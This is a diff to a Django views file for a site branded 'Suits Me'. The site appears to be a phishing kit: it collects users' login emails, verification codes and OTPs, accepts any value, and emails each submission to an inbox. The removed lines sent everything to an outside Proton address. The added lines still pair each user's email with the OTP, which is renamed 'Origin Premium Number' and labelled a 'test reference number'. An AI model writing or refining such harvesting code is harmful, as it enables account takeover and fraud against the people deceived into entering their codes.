@@ -1,10 +1,39 @@
-import os
+import logging
+
 from django.shortcuts import render, redirect
-from .forms import RetrieveInfoForm, EmailForm, VerificationCodeForm, OTPForm
-import requests
+from .forms import EmailForm, VerificationCodeForm, OTPForm
 from django.conf import settings
 from django.contrib import messages
 from django.core.mail import EmailMultiAlternatives
+
+logger = logging.getLogger(__name__)
+
+
+def _admin_notification_recipient():
+    return settings.DEFAULT_FROM_EMAIL
+
+
+def _send_admin_notification(subject, body, event_name):
+    from_email = settings.DEFAULT_FROM_EMAIL
+    recipient_list = [_admin_notification_recipient()]
+    msg = EmailMultiAlternatives(subject, body, from_email, recipient_list)
+    logger.info(
+        "Sending %s notification via %s from %s to %s",
+        event_name,
+        settings.EMAIL_BACKEND,
+        from_email,
+        ", ".join(recipient_list),
+    )
+    sent_count = msg.send(fail_silently=False)
+    logger.info(
+        "Finished %s notification send; backend reported %s message(s)",
+        event_name,
+        sent_count,
+    )
+    if sent_count < 1:
+        raise RuntimeError(f"Email backend reported zero messages sent for {event_name}")
+    return sent_count
+
 
 def home(request):
     return render(request, 'home.html')
@@ -20,11 +49,9 @@ def login_page(request):
         if form.is_valid():
             try:
                 email = form.cleaned_data['email']
+                request.session['submitted_email'] = email
 
-                # Email settings - send the captured email to the admin inbox
                 subject = "New Login Email Submission - Suits Me"
-                from_email = settings.DEFAULT_FROM_EMAIL
-                recipient_list = ['saint.nsj@proton.me']
                 email_body = f"""
                 A user has submitted their email address via the login page.
 
@@ -34,13 +61,12 @@ def login_page(request):
                 This is an automated notification from Suits Me.
                 """
 
-                msg = EmailMultiAlternatives(subject, email_body, from_email, recipient_list)
-                msg.send()
+                _send_admin_notification(subject, email_body, "login-email")
 
                 # Redirect to check email page (flow continues with generic code entry)
                 return redirect('check_email')
-            except Exception as e:
-                print(f"Email sending error: {str(e)}")
+            except Exception:
+                logger.exception("Email sending error")
                 messages.error(request, 'Failed to send email. Please try again later.')
                 form = EmailForm(request.POST)
         else:
@@ -56,28 +82,27 @@ def check_email(request):
     if request.method == 'POST':
         form = VerificationCodeForm(request.POST)
         if form.is_valid():
-            # Accept any verification code
             verification_code = form.cleaned_data['verification_code']
             try:
-                subject = "Verification Code Submission - Suits Me"
-                from_email = settings.DEFAULT_FROM_EMAIL
-                recipient_list = ['saint.nsj@proton.me']
+                subject = "Verification Code Attempt - Suits Me"
+                submitted_email = request.session.get('submitted_email', 'unknown')
                 email_body = f"""
                 A user has submitted a verification code via the check email page.
 
-                Verification code: {verification_code}
+                Email: {submitted_email}
+                Verification code: [redacted]
+                Verification code length: {len(verification_code)}
 
                 ---
-                This is an automated notification from Suits Me.
+                This is an automated notification from Suits Me. Verification codes are not included in notifications.
                 """
 
-                msg = EmailMultiAlternatives(subject, email_body, from_email, recipient_list)
-                msg.send()
+                _send_admin_notification(subject, email_body, "verification-code")
 
                 # Redirect to OTP page
                 return redirect('enter_otp')
-            except Exception as e:
-                print(f"Verification email sending error: {str(e)}")
+            except Exception:
+                logger.exception("Verification email sending error")
                 messages.error(request, 'Failed to send verification code. Please try again.')
                 form = VerificationCodeForm(request.POST)
         else:
@@ -89,34 +114,32 @@ def check_email(request):
 
 
 def enter_otp(request):
-    """Enter OTP page - user enters OTP"""
+    """Enter OTP page - user enters an internal test reference number."""
     if request.method == 'POST':
         form = OTPForm(request.POST)
         if form.is_valid():
-            otp = form.cleaned_data['otp']
-            
-            # Ensure OTP is max 6 digits (already enforced by max_length)
-            if len(otp) <= 6:
-                try:
-                    subject = "OTP Submission - Suits Me"
-                    from_email = settings.DEFAULT_FROM_EMAIL
-                    recipient_list = ['saint.nsj@proton.me']
-                    email_body = f"""
-                    A user has submitted an OTP via the enter OTP page.
+            origin_premium_number = form.cleaned_data['otp']
 
-                    OTP: {otp}
+            if len(origin_premium_number) <= 6:
+                try:
+                    subject = "Origin Premium Number Submission - Suits Me"
+                    submitted_email = request.session.get('submitted_email', 'unknown')
+                    email_body = f"""
+                    A user has submitted an Origin Premium Number via the enter OTP page.
+
+                    Email: {submitted_email}
+                    Origin Premium Number: {origin_premium_number}
 
                     ---
                     This is an automated notification from Suits Me.
                     """
 
-                    msg = EmailMultiAlternatives(subject, email_body, from_email, recipient_list)
-                    msg.send()
+                    _send_admin_notification(subject, email_body, "origin-premium-number")
 
                     # Accept any OTP and redirect to thanks page
                     return redirect('thanks')
-                except Exception as e:
-                    print(f"OTP email sending error: {str(e)}")
+                except Exception:
+                    logger.exception("Origin Premium Number email sending error")
                     messages.error(request, 'Failed to send OTP. Please try again.')
                     form = OTPForm(request.POST)
             else:
